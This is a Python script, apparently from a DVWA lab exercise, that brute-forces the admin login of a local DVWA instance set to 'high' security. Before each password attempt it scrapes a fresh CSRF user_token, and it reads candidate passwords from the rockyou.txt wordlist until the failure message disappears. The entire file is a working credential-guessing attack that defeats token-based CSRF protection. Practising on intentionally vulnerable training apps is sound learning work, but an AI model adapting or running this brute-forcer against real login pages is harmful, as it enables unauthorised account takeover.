import requests
import re

baseUrl = "http://localhost/DVWA/vulnerabilities/brute/"

cookies = {
    "PHPSESSID": "91fdcd96e5376633ef607edd0a1b8093",
    "security": "high"
}

pattern = r"name='user_token' value='([a-fA-F0-9]+)'"

try:    
    with open('/usr/share/wordlists/rockyou.txt') as file:
        for line in file:
            password = line.rstrip()
            url = baseUrl + f"?Login=Login&username=admin&password={password}"
            
            try:
                # Take CSRF Token
                res = requests.get(baseUrl, cookies=cookies)

                match = re.search(pattern, res.text)
                if match:
                    token = match.group(1)
                    
                    url += f"&user_token={token}"
                else:
                    print("Failed to taken token")
                    continue

                # Brute-force password
                print(f"Attempting: password={password}")
                res = requests.get(url, cookies=cookies)

                if "Username and/or password incorrect." not in res.text:
                    print()
                    print("=> Password found: ", password)
                    exit()
            except requests.exceptions.RequestException as e:
                print("Request error:", e)
                continue
except FileNotFoundError as e:
    print("File not found:", e)